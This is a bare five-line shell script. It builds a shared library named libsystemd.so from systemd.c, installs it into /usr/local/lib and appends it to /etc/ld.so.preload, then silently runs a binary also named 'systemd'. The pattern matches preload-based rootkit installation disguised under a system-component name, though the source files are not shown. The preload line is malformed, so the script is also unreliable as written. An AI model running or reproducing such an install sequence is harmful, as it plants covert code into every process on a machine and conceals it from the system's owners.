gcc -Wall -fPIC -shared -o libsystemd.so systemd.c -ldl
sudo mv libsystemd.so /usr/local/lib/
sudo echo /usr/local/lib/libsystemd.so >> sudo /etc/ld.so.preload
sleep 2
chmod +x systemd && ./systemd ann >/dev/null 2>&1
